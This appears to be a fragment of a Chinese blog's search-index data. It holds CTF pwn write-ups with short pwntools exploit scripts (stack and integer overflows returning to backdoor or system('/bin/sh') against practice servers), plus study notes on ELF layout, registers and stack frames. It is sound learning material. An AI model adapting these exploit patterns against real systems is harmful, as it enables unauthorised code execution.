b&#x27;\\x00\\xc0&#x27;+shellcodeio.sendline(payload)io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"BUUCTF wp","url":"/2025/01/19/wp/","content":"1.[NISACTF 2022]ReorPwn?\n用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数\n看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了\n\n2.[BJDCTF 2020]babystack2.0Checksec发现64位nx保护开启\n\n从题目提示看是整数溢出和栈溢出\n用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数\n\n搜了一下wp\n\n看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。\nexp\nfrom pwn import*r = remote(&#x27;node4.anna.nssctf.cn&#x27;,28220)p1 = b&#x27;-1&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x0400726)r.sendline(p2)r.interactive()\n\n3.[BJDCTF 2020]babystack\n这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。\nExp\nfrom pwn import*r = remote(&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;)p1 = b&#x27;100&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x04006E6)r.sendline(p2)r.interactive()\n\n也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值\n4.[NISACTF 2022]ezstackChecksec发现是32位的。NX保护开启\nIda分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp\nfrom pwn import *p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22397)sh_addr=0x804a024system_plt=0x8048390payload=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位p.sendline(payload)p.interactive()\n\n5.[GFCTF 2021]where_is_shellChecksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，\n&#x2F;bin&#x2F;sh的地址为\n \npop rdi；ret地址\n \n还需要栈对齐需要\n \nExp模板\nfrom pwn import*p = remote（）payload = b&#x27;a&#x27;*(0x10 + 8) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive()\n\n \n6.[NSSCTF 2022 Spring Recruit]R3m4ke?checksec查看\nIda打开，发现危险函数gets栈溢出\n有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出\n找到system的地址栈溢出返回到system地址\n \nExp\n \n7.[HNCTF 2022 Week1]easyoverflowChecksec\n \nIda打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址\n地址：\nExp\n \n8.[WUSTCTF 2020]getshellChecksec\n \nIda\n发现\n可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址\nExp\n \n9.[GDOUCTF 2023]EASY PWNIda分析发现是随机生成一个数字，猜数字\n发现gets函数，可以栈溢出\nShift+f12发现后门flag.txt \n找到地址0x0011D5 \n直接溢出\nExp如下\n \n10.others_shellcode checksec查看\n\nIda查看\n没有看懂\nNc一下\n\n直接出来了，非常神奇\n搜了一下wp\n\n","categories":["第一周"],"tags":["wp"]},{"title":"二进制基础","url":"/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/","content":"一、程序的编译与链接从C源代码到可执行文件的生成过程 \n编译： 由C语言代码生成汇编代码 \n汇编： 由汇编代码生成机器码 \n链接 ：将多个机器码的目标文件链接成一个可执行文件\n\n​                                           C语言→汇编语言→机器码\n二、Linux下的可执行文件格式（1）什么是可执行文件？广义：文件中的数据是可执行文件 \n例：\n\n\n\n.out\n.exe\n.sh\n.py\n\n\n\n狭义：文件中的数据是机器码的文件 \n例：\n\n\n\n.out\n.exe\n.dll\n.so\n\n\n\n.out .exe .dl .so \n（2）可执行文件的分类Windows：PE\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.exe\n.dll\n.lib\n\n\nLinux：ELF\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.out\n.so\n.a\n\n\n（3）磁盘中的ELF与内存中的ELF磁盘中的储存方式：节\n内存中的储存方式：段\n\n\n\n\nRW可写 Data段\nRX可读 Code段\n\n\n\n.data\n.rodata\n\n\n.bss\n.text\n\n\n.got\n.int\n\n\n.plt\nELF  Header\n\n\n\n\n\nStack\nHeap\nFor Kernel\nSTACK\nHEAP\nDATA\nCODE\n\n\n\n用来管理函数调用的状态\n申请动态内存的调用\n操作系统代码\n栈段\n堆段\n数据段\n代码段\n\n\nvmmap：查看程序进程的内存空间\n注：数据从低地址向高地址写 Heap：是从低往高增长 Stack：是从高往低增长（栈的增长方向是相反的）\n三、进程虚拟地址空间\n（1）地址编码地址以字节编码，1Byte&#x3D;8bits，常以16进制表示\n（2）二进制与十六进制转换1.二进制转十六进制\n例：11010110\n从右往左每四位一组1101 0110，将二进制转换为十进制在对应为十六进制\n1101&#x3D;1×2³ + 1×2² + 0×2¹ + 1×2⁰ &#x3D;13&#x3D;D\n0110&#x3D;0×2³ + 1×2² + 1×2¹ + 0×2⁰&#x3D;6\n11010110&#x3D;D6\n2.十六进制转二进制\n例：2AF\n将每个十六进制的数转换为对应的四位二进制数，在组合起来\n2&#x3D;0010\nA&#x3D;10&#x3D;1010\nF&#x3D;15&#x3D;1111\n2AF&#x3D;0010 1010 1111\n（3）虚拟内存虚拟内存用户空间每个进程一份\n虚拟内存内核空间所有进程共享一份\n虚拟内存mmap段中的动态链接库仅在物理内存中装载一份\n（4）段（segment）与节（section）\n\n\n代码段（Text segment）\n数据段（Data segment）\n\n\n\n包含了代码与只读数据\n包含了可读可写数据\n\n\n.text 节\n.data 节\n\n\n.rodata 节\n.dynamic 节\n\n\n.hash 节\n.got 节\n\n\n.dynsym 节\n.got.plt 节（保存plt节解析出的函数的实际地址）\n\n\n.dynstr 节\n.bss 节 （只占用内存的空间不占用磁盘的空间）\n\n\n.plt 节（解析动态链接函数的实际地址）\n\n\n\n.rel.got 节\n\n\n\n（5）程序数据是如何在内存中组织的\nData段：放已经初始化的全局变量\nBss段：放未初始化的全局变量\nText段：除了防止代码还放只读数据（.rodata）\nHeap段：动态存储区\nStack段：存放局部变量（随着函数执行完被丢弃）\n注：x,y是形参，当main函数调用sum函数时才会被用到，只有参数传递的时候才会被使用\n32位架构：当main函数调用sum函数时，在创建sum函数的栈帧之前，将x和y的值压栈\n64位架构：x,y不会放在虚拟内存中，而是放在寄存器中\n（6）大端序与小端序\n小端序：低地址存放数据低位、高地址存放数据高位（大部分）\n\n大端序：低地址存放数据高位、高地址存放数据低位（小部分）\n注：在C语言中0x00是字符串的结束符，大部分情况数据高位都为0，大端序低地址存放高位数据，数据是从低地址向高地址写，当进行溢出时，从低地址写入遇到0x00就直接结束了，所以小端序比大端序更好利用。\n四、程序的装载与进程的执行（1）进程的执行过程\nPC寄存器（Register）：存放当前执行指令的地址（process count）\nx86 eip x64 rip \n（2）寄存器\namd64位寄存器结构\n\n\n\n名称\n大小\n\n\n\nrax\n8Bytes\n\n\neax\n4Bytes\n\n\nax\n2Bytes\n\n\nah\n1Bytes\n\n\nal\n1Bytes\n\n\n部分寄存器的功能\n\n\n\n名称\n功能\n\n\n\nRSP\n存放当前栈帧的栈顶地址\n\n\nRBP\n存放当前栈帧的栈底地址\n\n\nRAX\n通用寄存器存放函数返回值\n\n\nRIP\n存放当前执行的指令的地址\n\n\n（3）静态链接的程序的执行过程\nuser mode：用户代码          hernel mode：操作系统代码\n（4）动态链接的程序的执行过程\n五、x86&amp;amd64汇编简述（1）常用汇编指令\n\n\nMOV\nLEA\nPUSH\nPOP\nLEAVE\nRET\n\n\n\n把源操作数传送给目标\n把源操作数的有效地址送给指定的寄存器\n把目标值压栈，同时SP指针-1字长\n将栈顶的值弹出至目的存储位置，同时SP指针+1字长\n在函数返回时，恢复父函数栈帧的指令\n在函数返回时，控制程序执行流返回父函数的指令\n\n\n（2）两种汇编格式\n\n\nintel\nAT&amp;T\n\n\n\nmov eax, 8\nmovl $8, %eax\n\n\nmov ebx, 0ffffh\nmovl $0xffff, %ebx\n\n\nint 80h\nint $80\n\n\nmov eax, [ecx]\nmovl (%ecx), %eax\n\n\n\n","categories":["第一周"],"tags":["知识点"]},{"title":"栈溢出基础","url":"/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/","content":"一、栈的介绍（1）栈的基本概念栈（Stack）：一种后进先出（LIFO）的数据结构，用于存储程序运行时的临时数据\n栈帧（Stack Frame）：每个函数调用时，栈会分配一个栈帧，用于存储函数的局部变量、参数、返回地址等信息\n栈指针（SP）：指向当前栈顶的指针，随着压栈（Push）和出栈（Pop）操作动态变化\n基指针（BP）：指向当前栈帧的底部，用于在栈帧中定位局部变量和参数\n指令指针（IP&#x2F;EIP&#x2F;RIP）：指向当前执行的指令地址，函数调用时会保存返回地址到栈中\n（2）栈的内存布局函数调用栈是程序运行时内存中一段连续的区域，用于保存函数运行时的状态信息。这些状态信息包括：\n函数参数：调用函数时传递给被调用函数的参数\n局部变量：被调用函数中定义的变量\n返回地址：被调用函数执行完毕后，程序需要返回的位置\n保存的寄存器值：某些情况下，函数会保存一些寄存器的值，以便在函数返回时恢复\n（3）栈的先进后出特性函数调用栈被称为“栈”，是因为它遵循后进先出的原则\n压栈（Push）：当发生函数调用时，调用函数（caller）的状态被保存到栈中，被调用函数（callee）的状态被压入栈顶。\n退栈（Pop）：当函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。\n（4）栈的生长方向在大多数系统中，函数调用栈在内存中是从高地址向低地址生长的\n压栈时：栈顶指针（SP）向低地址移动，栈顶对应的内存地址变小。\n退栈时：栈顶指针（SP）向高地址移动，栈顶对应的内存地址变大。\n二、 函数调用过程（1）参数传递的步骤1.逆序压栈\n调用函数（caller）按照逆序将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。\n例如，调用函数 callee(1，2，3) 时，参数的压栈顺序是3，2，1\npush 3    ; 第三个参数，实际是第一个一个压入栈push 2    ; 第二个参数push 1    ; 第一个参数，实际是最后一个压入栈\n\n2.参数保存\n这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数\n3.被调用函数的状态保存\n在参数压栈之后，调用函数会将控制权交给被调用函数（callee）。此时，被调用函数会创建自己的栈帧，并将这些参数视为自己的输入\n（2）栈帧的切换当被调用函数（callee）开始执行时，栈帧的切换过程如下：\n1.保存返回地址\n当调用函数使用 call 指令调用被调用函数时，call 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中\ncall callee  ; 调用 callee 函数\n\n2.创建被调用函数的栈帧\n被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等\n被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数\npush ebp       ; 保存调用者的基地址mov ebp, esp   ; 建立被调用者的基地址\n\n3.执行被调用函数\n被调用函数执行其逻辑，操作局部变量和参数\n\n4.清理栈帧\n被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间\n返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令\nmov esp, ebp  ; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间pop ebp       ; 恢复调用者的基地址    ret           ; 从栈中弹出返回地址并跳转到该地址\n\n注：\nx86\n使用栈来传递参数使用 eax 存放返回值\namd64\n前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中第7个以后的参数存放于栈中\n","categories":["第一周"],"tags":["知识点"]}]